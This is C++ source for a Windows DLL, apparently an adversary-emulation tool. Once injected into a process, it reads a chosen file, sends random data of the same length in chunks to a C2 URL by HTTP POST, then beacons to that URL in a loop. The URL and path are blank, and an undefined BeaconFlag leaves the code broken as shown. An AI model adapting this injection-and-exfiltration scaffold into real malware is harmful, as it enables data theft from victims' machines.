// This DLL will take the file at the given path (ExfilFile) send random data to a extenal url simulating that it is encrypting and exfilling real data.
// This DLL is meant to be injected via DLL injection to a normal process.

#include "pch.h"
#include "stdio.h"
#include "windows.h"
#include "exception"
#include <stdlib.h>
#include <string>
#include <cstring>
#include <fstream>
#include <sys/stat.h>
#include <iostream>
#include <WinInet.h>
#include <Lmcons.h>
#include <thread>
#include <mutex>
#include <random>
#pragma comment( lib,"Wininet.lib")
#define deb(zz) cout << #zz << " " << zz 
#define _WIN32_DCOM

using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
const LPCSTR url = ""; // URL to send data to
int C2Delay = 10000; //MS
int BeaconDelay = 300000; //MS
string ExfilFile = ""; // File path to encode data

string encData() {
    //Returns string of random characters based on the length of each character in the encoded text
    std::ifstream in(ExfilFile);
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::string contents((std::istreambuf_iterator<char>(in)),
        std::istreambuf_iterator<char>());
    std::string fakeEnc = "";

    for (int i = contents.length() - 1; i >= 0; i--) {
        //Gets a completely random character for each character in the exfil file. 
        std::uniform_int_distribution<> distrib(0, sizeof(alphanum) - 1);
        fakeEnc += alphanum[distrib(gen)];
    }
    return fakeEnc;
}

void sendData(string data)
{
    //strips linebreaks and then sends data to the C2 url as a POST. 
    data.erase(std::find(data.begin(), data.end(), '\0'), data.end());
    static char hdrs[] = "Content-Type: application/x-www-form-urlencoded";

    DWORD size = UNLEN + 1;
    int dlen = data.length();
    char frmdata[512 + 6] = {};
    strcpy_s(frmdata, 200, data.c_str());

    HINTERNET hSession = InternetOpenA("http generic", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) {
        deb("hsession exception");
    }

    HINTERNET hConnect = InternetConnectA(hSession, url, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConnect) {
        deb("hconnect exception");
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, 0, 1);
    if (!hRequest) {
        deb("hreq exception");
    }
    cout << "Sending ";
    cout << frmdata;
    cout << "\n";
    cout << "\n";
    HttpSendRequestA(hRequest, hdrs, strlen(hdrs), frmdata, strlen(frmdata));
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
}

void c2exfil() {
    std::string data = encData();
    int len = data.size(); // size of the main string
    vector<string> sub_str; // vector of substrings

    for (int i = 0; i < len; i += 100) {
        //cuts the data into smaller blocks of 100 chars
        sub_str.push_back(data.substr(i, 100));
    }
    for (string i : sub_str) {
        cout << "orig req:\n";
        cout << i;
        cout << "\n";
        sendData(i);
        Sleep(C2Delay);
    }
}

bool c2beacon() {
    while (TRUE==TRUE){
        sendData(BeaconFlag);
        Sleep(C2Delay);
    }
    return TRUE;
}
DWORD __stdcall hackthread(HMODULE hModule)
{
    c2exfil();
    c2beacon();
    return TRUE;
}


INT APIENTRY DllMain(HMODULE hDLL, DWORD Reason, LPVOID Reserved) {
    switch (Reason) {
    case DLL_PROCESS_ATTACH:
    {
    //opens new thread when dll is attached to injected process. This is more stable than running it in the same thread. 
    CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)hackthread, hDLL, 0, nullptr));
    }
        break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

